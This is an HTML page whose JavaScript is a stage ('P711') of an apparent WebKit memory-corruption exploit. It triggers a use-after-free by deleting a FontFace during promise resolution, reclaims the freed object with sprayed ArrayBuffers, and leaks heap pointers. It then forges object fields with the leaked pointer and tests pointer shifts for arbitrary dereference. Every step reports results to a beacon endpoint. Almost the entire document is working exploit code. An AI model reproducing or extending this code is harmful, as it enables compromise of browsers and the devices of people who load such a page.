<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P711 — Winning Pair (q12 + q6) Dereference & Execution Scout</title>
<script>
'use strict';
/* ============================================================
 * P711 — Winning Pair (q12 + q6) Dereference & Execution Scout
 *
 * Ground Truth from P710:
 * - All 23 fields tested against q12=P58.
 * - q6 (+0x30 / 48B) was the GOLDEN HIT: survived and WebKit wrote:
 *     q0  = 0x1 (RefCount initialized)
 *     q11 = new heap pointer
 *     q12 = 0x2000000000 (m_capacity/mask)
 *     q13 = new WeakPtr address
 *   with nz=14 non-zero entries.
 *
 * P711 Phases:
 * 1. LEAK: Baseline leak of P58 and P68.
 * 2. STABLE_RECLAIM: Pre-fill q12=P58 and q6=P58 -> capture live buffer and FACE_B.
 * 3. ENGINE_WRITES_DUMP: Analyze and record the 4 engine-written fields.
 * 4. FONT_OPS: Probe FACE_B operations (status, family, loaded, load()).
 * 5. CANVAS_RENDER: Force layout / glyph rasterization via measureText & fillText.
 * 6. PERTURB_TEST: Controlled shift of q6 pointer to observe arbitrary dereference.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P711-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

function snap(){
  if(!VIEW_B) return [];
  var arr = [];
  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
  return arr;
}

function diffSnap(pre){
  if(!VIEW_B || !pre.length) return 'none';
  var ch = [];
  for(var q=0; q<24; q++){
    if(VIEW_B[q] !== pre[q]){
      ch.push('q' + q + '=0x' + h16(VIEW_B[q]));
    }
  }
  return ch.length ? ch.join(',') : 'none';
}

/* ============================================================
 * Main Runner Pipeline
 * ============================================================ */
function run(){
  b('BOOT','p711-winning-pair-scout');
  log('=== P711 Winning Pair (q12 + q6) Execution Scout ===\n');

  /* Step 1: Baseline Leak */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Winning Pair Reclaim (q12=P58, q6=P58) */
    log('[Step 2] Triggering winning pair reclaim (q12 + q6)...');
    doWinningReclaim(function(){
      /* Step 3: Probe FontFace properties */
      log('\n[Step 3] Probing FontFace object operations...');
      probeFontFace(function(){
        /* Step 4: Canvas rendering & metrics */
        log('\n[Step 4] Probing Canvas glyph measurement & rendering...');
        probeCanvas(function(){
          /* Step 5: Perturbation / Pointer shifts */
          log('\n[Step 5] Probing controlled pointer shifts...');
          probePerturbation();
        });
      });
    });
  });
}

/* ---- Step 1: Baseline UAF ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');
  for(var q=0;q<24;q++){
    var val = v[q];
    if(val >= LOW && val < HIGH){
      if(!P58) P58 = val;
      else if(!P68 && val !== P58) P68 = val;
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Stable Winning Pair Reclaim ---- */
function doWinningReclaim(cb){
  b('RECLAIM-GO', 'fill_q12_q6=0x' + h16(P58));

  var stW = document.createElement('style');
  stW.textContent = '@font-face{font-family:winFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stW);

  FACE_B = new FontFace('winFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW = [], firedW = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stW){ stW.remove(); stW.textContent = ''; stW = null; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      for(var k=0; k<60; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;  /* Golden Hit pair */
        view[6]  = P58;  /* Golden Hit pair */
        absW.push(ab);
      }
      try{ document.fonts.check('1em winFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em winFace, winFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<absW.length; i++){
      var u = new Uint8Array(absW[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = absW[best];
    VIEW_B = new BigUint64Array(BUF_B);

    /* Dump engine writes */
    var changed = [];
    for(var q=0; q<24; q++){
      var exp = (q === 12 || q === 6) ? P58 : 0n;
      if(VIEW_B[q] !== exp){
        changed.push('q' + q + '=0x' + h16(VIEW_B[q]));
      }
    }

    var dumpStr = 'nz=' + bestNz + '|q0=0x' + h16(VIEW_B[0]) + '|q11=0x' + h16(VIEW_B[11]) +
                  '|q12=0x' + h16(VIEW_B[12]) + '|q13=0x' + h16(VIEW_B[13]) + '|allCh=' + changed.join(',');
    b('RECLAIM-OK', dumpStr);
    log('Reclaim Success: ' + dumpStr);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Probe FontFace Object Operations ---- */
function probeFontFace(cb){
  if(!FACE_B || !VIEW_B){ b('PROBE-SKIP','no-face'); cb(); return; }

  var pre = snap();
  var res = {};

  try { res.status = FACE_B.status; } catch(e){ res.status = e.message; }
  try { res.family = FACE_B.family; } catch(e){ res.family = e.message; }
  try { res.loaded = typeof FACE_B.loaded; } catch(e){ res.loaded = e.message; }

  var diff = diffSnap(pre);
  b('PROBE-PROPS', 'status=' + res.status + '|fam=' + res.family + '|loaded=' + res.loaded + '|writes=' + diff);
  log('Props: status=' + res.status + ', family=' + res.family + ', writes=' + diff);

  /* Test face.load() */
  pre = snap();
  try {
    var p = FACE_B.load();
    b('PROBE-LOAD', 'type=' + typeof p + '|writes=' + diffSnap(pre));
    log('face.load() executed cleanly.');
  } catch(e) {
    b('PROBE-LOAD-ERR', (e.message||'').slice(0,100));
  }

  /* Test document.fonts.check with our handle */
  pre = snap();
  try {
    var chk = document.fonts.check('1em winFace');
    b('PROBE-FCHECK', 'chk=' + chk + '|writes=' + diffSnap(pre));
    log('fonts.check("1em winFace") = ' + chk);
  } catch(e) {
    b('PROBE-FCHECK-ERR', (e.message||'').slice(0,100));
  }

  setTimeout(cb, 100);
}

/* ---- Step 4: Canvas Metrics & Rendering ---- */
function probeCanvas(cb){
  if(!VIEW_B){ b('CANVAS-SKIP',''); cb(); return; }

  var cv = document.createElement('canvas'); cv.width = 120; cv.height = 40;
  var ctx = cv.getContext('2d');

  /* 4A: measureText */
  var pre = snap();
  var measuredWidth = -1;
  try {
    ctx.font = '24px winFace, Arial';
    var m = ctx.measureText('Antigravity');
    measuredWidth = m.width;
    b('CANVAS-MEASURE', 'w=' + measuredWidth + '|writes=' + diffSnap(pre));
    log('measureText("Antigravity") width = ' + measuredWidth + ' (writes=' + diffSnap(pre) + ')');
  } catch(e) {
    b('CANVAS-MEASURE-ERR', (e.message||'').slice(0,100));
  }

  /* 4B: fillText & pixel readback */
  pre = snap();
  var nzPixels = 0;
  try {
    ctx.fillStyle = '#ff0000';
    ctx.fillText('Antigravity', 5, 25);
    var px = ctx.getImageData(0,0,120,40).data;
    for(var i=0; i<px.length; i+=4){
      if(px[i]>0 || px[i+1]>0 || px[i+2]>0) nzPixels++;
    }
    b('CANVAS-RENDER', 'nzPixels=' + nzPixels + '|writes=' + diffSnap(pre));
    log('fillText rendered ' + nzPixels + ' non-zero pixels (writes=' + diffSnap(pre) + ')');
  } catch(e) {
    b('CANVAS-RENDER-ERR', (e.message||'').slice(0,100));
  }

  setTimeout(cb, 100);
}

/* ---- Step 5: Controlled Pointer Perturbation ---- */
function probePerturbation(){
  if(!VIEW_B){ b('PERTURB-SKIP',''); return; }

  b('PERTURB-GO','');
  log('Testing controlled memory shift on q6 (P58 + 0x10)...');

  /* Shift q6 by 16 bytes and test if measureText reflects difference */
  var pre = snap();
  VIEW_B[6] = P58 + 0x10n;

  var cv = document.createElement('canvas'); cv.width = 100; cv.height = 30;
  var ctx = cv.getContext('2d');
  ctx.font = '20px winFace, sans-serif';

  try {
    var m = ctx.measureText('XYZ');
    b('PERTURB-RESULT', 'shift=0x10|w=' + m.width + '|writes=' + diffSnap(pre));
    log('Perturbed measureText width: ' + m.width);
  } catch(e) {
    b('PERTURB-ERR', (e.message||'').slice(0,100));
  }

  b('DONE','p711-scout-complete');
  log('\n=== P711 Complete! All beacons transmitted. ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">Loading P711 Scout...</pre></body></html>
